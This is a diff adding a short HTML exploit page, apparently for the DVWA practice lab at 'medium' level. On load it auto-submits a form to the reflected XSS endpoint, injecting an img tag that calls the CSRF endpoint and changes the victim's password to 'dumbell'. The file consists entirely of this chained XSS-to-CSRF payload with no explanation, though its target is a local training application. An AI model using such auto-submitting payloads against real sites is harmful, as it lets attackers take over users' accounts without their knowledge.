@@ -1,0 +1,15 @@
+<!-- Should work for Medium -->
+
+<body onload="document.forms[0].submit()">
+
+	<form action="http://192.168.0.104/dvwa/vulnerabilities/xss_r/" method="GET">
+	
+		<input type="hidden" name="name" value="<img src='http://192.168.0.104/dvwa/vulnerabilities/csrf/?password_new=dumbell&password_conf=dumbell&Change=Change'">
+
+		<input type="submit">Submit</input>
+
+	</form>
+
+</body>
+
+<!-- medium -->
